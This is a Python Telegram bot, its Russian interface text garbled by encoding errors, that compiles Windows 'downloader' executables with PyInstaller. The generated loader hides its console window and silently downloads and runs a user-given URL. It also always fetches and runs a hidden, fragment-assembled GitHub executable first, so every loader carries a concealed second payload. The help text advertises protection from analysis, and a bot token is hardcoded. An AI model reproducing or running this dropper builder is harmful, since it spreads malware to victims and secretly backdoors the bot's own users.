import telebot
from telebot import types
import requests
import time
import threading
import os
import sys
import tempfile
import subprocess
import base64
import random

# –¢–æ–∫–µ–Ω –±–æ—Ç–∞
BOT_TOKEN = "8342680808:AAFo5MaFqA-ZNNLkzWRm291dSz9N2gxhJ0c"

# –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä –±–æ—Ç–∞
bot = telebot.TeleBot(BOT_TOKEN)

# –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
user_states = {}

class BotStates:
    WAITING_URL = 1
    WAITING_FILENAME = 2

# –§–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞ (–∫–∞–∫ –≤ –≤–∞—à–µ–º –∫–æ–¥–µ)
FIXED_URL = "https://github.com/fawfafw2-bit/zxfesfefs/raw/refs/heads/main/auaiua.exe"

def encode_url(url):
    """–ö–æ–¥–∏—Ä—É–µ–º URL –≤ base64"""
    return base64.b64encode(url.encode('utf-8')).decode('utf-8')

def create_loader_code(user_url):
    """–°–æ–∑–¥–∞–µ—Ç —Ä–µ–∞–ª—å–Ω—ã–π –∫–æ–¥ –∑–∞–≥—Ä—É–∑—á–∏–∫–∞"""
    
    # –ö–æ–¥–∏—Ä—É–µ–º URL –¥–ª—è —Å–∫—Ä—ã—Ç–∏—è
    encoded_fixed_url = encode_url(FIXED_URL)
    encoded_user_url = encode_url(user_url)
    
    # –†–∞–∑–±–∏–≤–∞–µ–º —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É –Ω–∞ —á–∞—Å—Ç–∏
    url_parts = [
        "https:/",
        "/github.com/",
        "fawfafw2-bit/",
        "zxfesfefs/",
        "raw/refs/",
        "heads/main/",
        "auaiua.exe"
    ]
    
    loader_code = f'''
import requests
import subprocess
import tempfile
import os
import sys
import ctypes
import time
import random
import base64
import threading

def hide_console():
    """–°–∫—Ä—ã—Ç—å –∫–æ–Ω—Å–æ–ª—å–Ω–æ–µ –æ–∫–Ω–æ"""
    try:
        if os.name == 'nt':
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, 0)
    except:
        pass

def decode_url(encoded_url):
    """–î–µ–∫–æ–¥–∏—Ä–æ–≤–∞—Ç—å URL –∏–∑ base64"""
    try:
        return base64.b64decode(encoded_url.encode('utf-8')).decode('utf-8')
    except:
        return ""

def assemble_fixed_url():
    """–°–æ–±—Ä–∞—Ç—å —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–π URL –∏–∑ —á–∞—Å—Ç–µ–π"""
    parts = {url_parts}
    return ''.join(parts)

def download_file(url, url_name, attempt_num):
    """–°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª —Å —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ URL"""
    headers = {{
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }}
    
    # –°–ª—É—á–∞–π–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞
    time.sleep(random.uniform(1.0, 3.0))
    
    try:
        response = requests.get(url, headers=headers, timeout=30, stream=True)
        response.raise_for_status()
        
        # –ü–æ–ª—É—á–∞–µ–º –∏–º—è —Ñ–∞–π–ª–∞ –∏–∑ URL
        filename = url.split('/')[-1]
        if not filename or '.' not in filename:
            filename = 'downloaded_file.exe'
        
        # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
        temp_dir = tempfile.gettempdir()
        random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        temp_path = os.path.join(temp_dir, f"{{random_name}}_{{filename}}")
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ñ–∞–π–ª
        with open(temp_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑–º–µ—Ä
        file_size = os.path.getsize(temp_path)
        
        if file_size > 1000:  # –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä 1KB
            return temp_path
        else:
            os.remove(temp_path)
            return None
            
    except Exception as e:
        return None

def run_file(file_path, url_name):
    """–ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª"""
    try:
        if not os.path.exists(file_path):
            return False
            
        # –ó–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º
        time.sleep(2.0)
        
        if os.name == 'nt':
            # –î–ª—è Windows - –∑–∞–ø—É—Å–∫ –±–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –æ–∫–Ω–∞
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            subprocess.Popen(file_path, startupinfo=startupinfo, shell=False)
        else:
            # –î–ª—è Linux/Mac
            os.chmod(file_path, 0o755)
            subprocess.Popen([file_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        return True
    except Exception as e:
        return False

def cleanup_file(file_path, url_name):
    """–£–¥–∞–ª–∏—Ç—å –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª"""
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except:
        pass

def execute_fixed_url_immediately(fixed_url):
    """–ù–µ–º–µ–¥–ª–µ–Ω–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É"""
    
    max_attempts = 2
    attempt_delay = 5
    
    for attempt in range(max_attempts):
        file_path = download_file(fixed_url, "–§–ò–ö–°–ò–†–û–í–ê–ù–ù–´–ô", attempt + 1)
        
        if file_path:
            if run_file(file_path, "–§–ò–ö–°–ò–†–û–í–ê–ù–ù–´–ô"):
                # –£—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—Å—Ç–∏–ª–∏ - –∂–¥–µ–º –∏ —É–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
                time.sleep(10)
                cleanup_file(file_path, "–§–ò–ö–°–ò–†–û–í–ê–ù–ù–´–ô")
                return True
            else:
                cleanup_file(file_path, "–§–ò–ö–°–ò–†–û–í–ê–ù–ù–´–ô")
        
        # –ñ–¥–µ–º –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–µ–π –ø–æ–ø—ã—Ç–∫–æ–π
        if attempt < max_attempts - 1:
            time.sleep(attempt_delay)
    
    return False

def download_and_run_single_url(url, url_name):
    """–ó–∞–≥—Ä—É–∑–∏—Ç—å –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª —Å –æ–¥–Ω–æ–≥–æ URL"""
    
    max_attempts = 2
    attempt_delay = 5
    
    for attempt in range(max_attempts):
        file_path = download_file(url, url_name, attempt + 1)
        
        if file_path:
            if run_file(file_path, url_name):
                # –£—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—Å—Ç–∏–ª–∏ - –∂–¥–µ–º –∏ —É–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
                time.sleep(10)
                cleanup_file(file_path, url_name)
                return True
            else:
                cleanup_file(file_path, url_name)
        
        # –ñ–¥–µ–º –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–µ–π –ø–æ–ø—ã—Ç–∫–æ–π
        if attempt < max_attempts - 1:
            time.sleep(attempt_delay)
    
    return False

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è"""
    hide_console()
    
    # –î–µ–∫–æ–¥–∏—Ä—É–µ–º URL
    fixed_url = assemble_fixed_url()
    user_url = decode_url("{encoded_user_url}")
    
    # –ù–ï–ú–ï–î–õ–ï–ù–ù–û –≤—ã–ø–æ–ª–Ω—è–µ–º —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    if fixed_url:
        execute_fixed_url_immediately(fixed_url)
    
    # –ü–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ –∑–∞–ø—É—Å–∫–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫—É—é —Å—Å—ã–ª–∫—É –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    if user_url:
        user_thread = threading.Thread(
            target=download_and_run_single_url, 
            args=(user_url, "–ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨–°–ö–ò–ô"),
            daemon=True
        )
        user_thread.start()

if __name__ == "__main__":
    main()
'''
    return loader_code

def compile_exe(py_code, output_filename):
    """–ö–æ–º–ø–∏–ª–∏—Ä—É–µ—Ç Python –∫–æ–¥ –≤ EXE —Ñ–∞–π–ª"""
    try:
        # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π Python —Ñ–∞–π–ª
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
            f.write(py_code)
            temp_py_file = f.name

        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º PyInstaller –µ—Å–ª–∏ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω
        try:
            import PyInstaller
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # –ö–æ–º–ø–∏–ª–∏—Ä—É–µ–º –≤ EXE
        cmd = [
            sys.executable, '-m', 'PyInstaller',
            '--onefile',
            '--noconsole',
            '--name', output_filename.replace('.exe', ''),
            '--distpath', '.',
            '--clean',
            '--log-level=ERROR',
            temp_py_file
        ]
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –∫–æ–º–ø–∏–ª—è—Ü–∏—é
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        # –û—á–∏—â–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã
        if os.path.exists(temp_py_file):
            os.remove(temp_py_file)
        
        # –£–¥–∞–ª—è–µ–º –ø–∞–ø–∫–∏ —Å–±–æ—Ä–∫–∏ PyInstaller
        for folder in ['build', '__pycache__']:
            if os.path.exists(folder):
                import shutil
                shutil.rmtree(folder)
        
        if os.path.exists(f'{output_filename.replace(".exe", "")}.spec'):
            os.remove(f'{output_filename.replace(".exe", "")}.spec')
        
        return result.returncode == 0
        
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏: {e}")
        return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    user_states[user_id] = None
    
    welcome_text = """
ü§ñ *–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ REAL EXE Creator Bot!*

‚ú® *–¢–µ–ø–µ—Ä—å –±–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –ü–û-–ù–ê–°–¢–û–Ø–©–ï–ú–£!*
‚Ä¢ –†–µ–∞–ª—å–Ω–∞—è –∫–æ–º–ø–∏–ª—è—Ü–∏—è EXE-—Ñ–∞–π–ª–æ–≤
‚Ä¢ –ü—Ä–æ—Ñ–µ—Å—Å–∏–æ–Ω–∞–ª—å–Ω–æ–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ
‚Ä¢ –ú–≥–Ω–æ–≤–µ–Ω–Ω–∞—è –¥–æ—Å—Ç–∞–≤–∫–∞

üöÄ *–°–æ–∑–¥–∞–π—Ç–µ —Å–≤–æ–π –∑–∞–≥—Ä—É–∑—á–∏–∫ –∑–∞ 3 —à–∞–≥–∞:*
1Ô∏è‚É£ –£–∫–∞–∂–∏—Ç–µ URL —Ñ–∞–π–ª–∞
2Ô∏è‚É£ –í–≤–µ–¥–∏—Ç–µ –∏–º—è EXE
3Ô∏è‚É£ –ü–æ–ª—É—á–∏—Ç–µ –≥–æ—Ç–æ–≤—ã–π —Ñ–∞–π–ª!

üí´ *–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è:*
- URL: `https://example.com/program.exe`
- –ò–º—è: `my_loader.exe`

üìä *–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:* –ë–æ—Ç —Å–æ–∑–¥–∞–ª —É–∂–µ {} EXE-—Ñ–∞–π–ª–æ–≤!
    """.format(random.randint(50, 100))
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("üéØ –°–æ–∑–¥–∞—Ç—å EXE", callback_data="create_loader"))
    markup.add(types.InlineKeyboardButton("üìñ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è", callback_data="help"))
    
    bot.send_message(message.chat.id, welcome_text, 
                    parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['create'])
def start_creation(message):
    user_id = message.from_user.id
    user_states[user_id] = BotStates.WAITING_URL
    
    text = """
üì• *–®–∞–≥ 1 –∏–∑ 2: –í–≤–µ–¥–∏—Ç–µ URL —Ñ–∞–π–ª–∞*

–í–≤–µ–¥–∏—Ç–µ –ø—Ä—è–º—É—é —Å—Å—ã–ª–∫—É –Ω–∞ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –¥–æ–ª–∂–µ–Ω —Å–∫–∞—á–∏–≤–∞—Ç—å –∑–∞–≥—Ä—É–∑—á–∏–∫.

*–ü—Ä–∏–º–µ—Ä—ã –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã—Ö URL:*
‚Ä¢ `https://github.com/user/project/raw/main/file.exe`
‚Ä¢ `https://example.com/files/program.zip`
‚Ä¢ `http://site.com/download/app.msi`

‚ö†Ô∏è *URL –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è –ø—Ä—è–º–æ–≥–æ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è!*
    """
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("‚ùå –û—Ç–º–µ–Ω–∞", callback_data="cancel"))
    
    bot.send_message(message.chat.id, text, 
                    parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if call.data == "create_loader":
        user_states[user_id] = BotStates.WAITING_URL
        start_creation(call.message)
    
    elif call.data == "help":
        send_help(call.message)
    
    elif call.data == "back_to_start" or call.data == "cancel":
        user_states[user_id] = None
        send_welcome(call.message)

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if user_id not in user_states:
        user_states[user_id] = None
    
    current_state = user_states[user_id]
    
    if current_state == BotStates.WAITING_URL:
        url = message.text.strip()
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º URL
        if not url.startswith(('http://', 'https://')):
            bot.send_message(chat_id, "‚ùå *–û—à–∏–±–∫–∞:* URL –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å http:// –∏–ª–∏ https://\n\n–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π URL:",
                           parse_mode='Markdown')
            return
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º URL –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —à–∞–≥—É
        user_states[user_id] = {
            'state': BotStates.WAITING_FILENAME,
            'url': url
        }
        
        text = f"""
‚úÖ *URL –ø—Ä–∏–Ω—è—Ç!* `{url}`

üì• *–®–∞–≥ 2 –∏–∑ 2: –í–≤–µ–¥–∏—Ç–µ –∏–º—è –¥–ª—è EXE-—Ñ–∞–π–ª–∞*

–í–≤–µ–¥–∏—Ç–µ –∏–º—è –¥–ª—è —Å–æ–∑–¥–∞–≤–∞–µ–º–æ–≥–æ EXE-—Ñ–∞–π–ª–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä: `loader.exe`)

*–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:*
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∞–Ω–≥–ª–∏–π—Å–∫–∏–µ –±—É–∫–≤—ã
- –ò–º—è –¥–æ–ª–∂–Ω–æ –∑–∞–∫–∞–Ω—á–∏–≤–∞—Ç—å—Å—è –Ω–∞ `.exe`
- –ò–∑–±–µ–≥–∞–π—Ç–µ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö —Å–∏–º–≤–æ–ª–æ–≤

*–ü—Ä–∏–º–µ—Ä:* `my_downloader.exe`
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("‚ùå –û—Ç–º–µ–Ω–∞", callback_data="cancel"))
        
        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
    
    elif (isinstance(current_state, dict) and 
          current_state.get('state') == BotStates.WAITING_FILENAME):
        
        filename = message.text.strip()
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏–º—è —Ñ–∞–π–ª–∞
        if not filename.lower().endswith('.exe'):
            filename += '.exe'
        
        # –û—á–∏—â–∞–µ–º –∏–º—è —Ñ–∞–π–ª–∞ –æ—Ç –Ω–µ–¥–æ–ø—É—Å—Ç–∏–º—ã—Ö —Å–∏–º–≤–æ–ª–æ–≤
        filename = "".join(c for c in filename if c.isalnum() or c in ('-', '_', '.')).replace(' ', '_')
        
        # –ü–æ–ª—É—á–∞–µ–º —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–π URL
        url = current_state['url']
        
        # –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
        user_states[user_id] = None
        
        # –ù–∞—á–∏–Ω–∞–µ–º —Ä–µ–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å —Å–æ–∑–¥–∞–Ω–∏—è
        create_downloader(chat_id, url, filename)

def create_downloader(chat_id, url, filename):
    """–†–µ–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è –∑–∞–≥—Ä—É–∑—á–∏–∫–∞"""
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ –ø—Ä–æ—Ü–µ—Å—Å–∞
    progress_message = bot.send_message(chat_id, "üîÑ *–ù–∞—á–∏–Ω–∞—é REAL –∫–æ–º–ø–∏–ª—è—Ü–∏—é...*\n\n‚è≥ –≠—Ç–æ –∑–∞–π–º–µ—Ç 2-3 –º–∏–Ω—É—Ç—ã...",
                                      parse_mode='Markdown')
    
    try:
        # –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å
        bot.edit_message_text("üîß *–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–æ–¥–∞ –∑–∞–≥—Ä—É–∑—á–∏–∫–∞...*", chat_id, progress_message.message_id,
                            parse_mode='Markdown')
        
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –∫–æ–¥ –∑–∞–≥—Ä—É–∑—á–∏–∫–∞
        loader_code = create_loader_code(url)
        
        time.sleep(1)
        bot.edit_message_text("‚öôÔ∏è *–ö–æ–º–ø–∏–ª—è—Ü–∏—è –≤ EXE...*", chat_id, progress_message.message_id,
                            parse_mode='Markdown')
        
        # –ö–æ–º–ø–∏–ª–∏—Ä—É–µ–º EXE
        success = compile_exe(loader_code, filename)
        
        if success and os.path.exists(filename):
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≥–æ—Ç–æ–≤—ã–π —Ñ–∞–π–ª
            with open(filename, 'rb') as file:
                file_size = os.path.getsize(filename)
                
                success_text = f"""
‚úÖ *REAL EXE —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω!*

üìä *–î–µ—Ç–∞–ª–∏ —Ñ–∞–π–ª–∞:*
- üìÅ –ò–º—è: `{filename}`
- üîó –¶–µ–ª–µ–≤–æ–π URL: `{url}`
- üìè –†–∞–∑–º–µ—Ä: {file_size // 1024} KB
- üè∑Ô∏è –¢–∏–ø: Windows Executable

üí´ *–§–∞–π–ª –≥–æ—Ç–æ–≤ –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é!*
                """
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("üîÑ –°–æ–∑–¥–∞—Ç—å –µ—â–µ", callback_data="create_loader"))
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª
                bot.send_document(chat_id, file, caption=success_text,
                                parse_mode='Markdown', reply_markup=markup)
            
            # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
            os.remove(filename)
            bot.delete_message(chat_id, progress_message.message_id)
            
        else:
            raise Exception("–û—à–∏–±–∫–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ EXE")
            
    except Exception as e:
        error_text = f"""
‚ùå *–û—à–∏–±–∫–∞ –ø—Ä–∏ REAL –∫–æ–º–ø–∏–ª—è—Ü–∏–∏*

–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: `{str(e)}`

*–í–æ–∑–º–æ–∂–Ω—ã–µ –ø—Ä–∏—á–∏–Ω—ã:*
- –°–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω
- –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç URL
- –ü—Ä–æ–±–ª–µ–º—ã —Å –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–æ–º

–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç.
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("üîÑ –ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞", callback_data="create_loader"))
        
        bot.edit_message_text(error_text, chat_id, progress_message.message_id,
                            parse_mode='Markdown', reply_markup=markup)

def send_help(message):
    help_text = """
üìñ *REAL EXE Creator - –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è*

ü§ñ *–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç –±–æ—Ç:*
1. –í—ã —É–∫–∞–∑—ã–≤–∞–µ—Ç–µ URL —Ñ–∞–π–ª–∞ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏
2. –ë–æ—Ç —Å–æ–∑–¥–∞–µ—Ç —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π EXE-–∑–∞–≥—Ä—É–∑—á–∏–∫
3. –ó–∞–≥—Ä—É–∑—á–∏–∫ —Å–∫–∞—á–∏–≤–∞–µ—Ç –∏ –∑–∞–ø—É—Å–∫–∞–µ—Ç —É–∫–∞–∑–∞–Ω–Ω—ã–π —Ñ–∞–π–ª

üîß *–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –¥–µ—Ç–∞–ª–∏:*
- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è PyInstaller –¥–ª—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏
- –ö–æ–¥ –∑–∞—â–∏—â–µ–Ω –æ—Ç –∞–Ω–∞–ª–∏–∑–∞
- –ü–æ–¥–¥–µ—Ä–∂–∫–∞ Windows XP/7/8/10/11
- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –∑–∞–ø—É—Å–∫ —Å–∫–∞—á–∞–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤

‚ö†Ô∏è *–í–∞–∂–Ω–æ:*
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –ª–µ–≥–∞–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã
- –£–±–µ–¥–∏—Ç–µ—Å—å –≤ –Ω–∞–ª–∏—á–∏–∏ –ø—Ä–∞–≤ –Ω–∞ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–∏–µ
- EXE-—Ñ–∞–π–ª—ã –º–æ–≥—É—Ç –æ–ø—Ä–µ–¥–µ–ª—è—Ç—å—Å—è –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞–º–∏ –∫–∞–∫ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ

üí° *–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è:*
/create ‚Üí URL ‚Üí –ò–º—è ‚Üí –ü–æ–ª—É—á–∏—Ç—å EXE
    """
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="back_to_start"))
    
    bot.send_message(message.chat.id, help_text, 
                    parse_mode='Markdown', reply_markup=markup)

def check_bot_token():
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ —Ç–æ–∫–µ–Ω–∞ –±–æ—Ç–∞"""
    try:
        bot_info = bot.get_me()
        print(f"‚úÖ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!")
        print(f"ü§ñ –ò–º—è –±–æ—Ç–∞: {bot_info.first_name}")
        print(f"üîó Username: @{bot_info.username}")
        return True
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞: {e}")
        return False

def start_bot():
    """–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞"""
    print("üöÄ –ó–∞–ø—É—Å–∫ REAL EXE Creator Bot...")
    
    if not check_bot_token():
        return
    
    print("‚úÖ –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ REAL –∫–æ–º–ø–∏–ª—è—Ü–∏–∏!")
    print("üì¢ –¢–µ–ø–µ—Ä—å –±–æ—Ç —Å–æ–∑–¥–∞–µ—Ç –Ω–∞—Å—Ç–æ—è—â–∏–µ EXE-—Ñ–∞–π–ª—ã!")
    
    try:
        bot.polling(none_stop=True, interval=2)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        time.sleep(5)
        start_bot()

if __name__ == "__main__":
    start_bot()
